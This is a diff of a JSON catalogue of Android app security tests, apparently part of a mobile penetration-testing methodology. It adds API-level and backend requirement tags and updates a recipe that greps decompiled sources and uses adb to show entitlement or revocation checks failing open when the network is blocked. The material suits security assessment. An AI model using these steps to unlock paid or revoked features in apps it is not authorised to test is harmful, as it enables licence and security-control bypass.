    "maps_to": "not covered by MASTG or the mainstream checklists; Android `NetworkMonitor`/captive-portal validation is the platform side",
    "record": "",
    "legacy_meta": {},
@@ -2584,8 +2679,11 @@
     "AM-11"
    ],
    "applies_to": "Android 15+ (all apps)",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "api>=35, device",
+   "requires_tags": [
+    "api>=35",
+    "device"
+   ],
    "maps_to": "developer.android.com Android 15 behaviour changes — background network access restrictions; requests started outside a valid process lifecycle throw `UnknownHostException` or a socket `IOException`",
    "record": "",
    "legacy_meta": {},
@@ -2608,7 +2706,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "On Android 15 a request started outside a valid process lifecycle fails. Check the error\nhandling of any *security-relevant* network call — token revocation, entitlement check, policy fetch,\nremote kill switch. Does the failure path fail open?",
-   "how": "```bash\ngrep -rn 'UnknownHostException' jadx_out/sources/ -A6 | grep -inE 'return true|allow|continue|ENTITLED|granted'\ngrep -rn 'catch (IOException' jadx_out/sources/ -A6 | grep -inE 'return true|allow|continue|cached'\nadb shell am force-stop <pkg>\nadb shell cmd deviceidle force-idle\n# or simply block the host at the gateway and re-enter the guarded feature\n```",
+   "how": "```bash\ngrep -rn 'UnknownHostException' $DEC/jadx/sources/ -A6 | grep -inE 'return true|allow|continue|ENTITLED|granted'\ngrep -rn 'catch (IOException' $DEC/jadx/sources/ -A6 | grep -inE 'return true|allow|continue|cached'\nadb shell am force-stop <pkg>\nadb shell cmd deviceidle force-idle\n# or simply block the host at the gateway and re-enter the guarded feature\n```",
    "proof": "A `catch (IOException) { return ALLOWED; }`-shaped handler on the revocation/entitlement\npath, reached when the platform blocks the background request — demonstrated by blocking the host and\nshowing the guarded feature unlocking.",
    "escalation": "→ D15, → D23 (business logic). This is the general \"fail-open under network denial\"\npattern and the Android 15 change is simply the most reliable way to trigger it.",
    "ruled_out_when": "Every security-relevant network failure path denies (fails closed), verified by\nblackholing the host at the gateway and observing the feature remain locked."
@@ -2628,8 +2726,10 @@
     "AM-01"
    ],
    "applies_to": "any versioned API — which is every mobile backend",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "corpus `hunt-shadow-api` Stages 1–3 and its severity table; the explicit chain from `apk-redteam-pipeline`. Described there as the highest-value mobile→backend bridge in the repository",
    "record": "",
    "legacy_meta": {},
@@ -2672,8 +2772,10 @@
    "attacker": "n/a",
    "attacker_ids": [],
    "applies_to": "every auth-bypass claim derived from decrypted mobile traffic",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "corpus `triage-validation` \"THE LAYER-ORDERING TRAP\" — described there as the single most transferable item in the repository",
    "record": "",
    "legacy_meta": {},
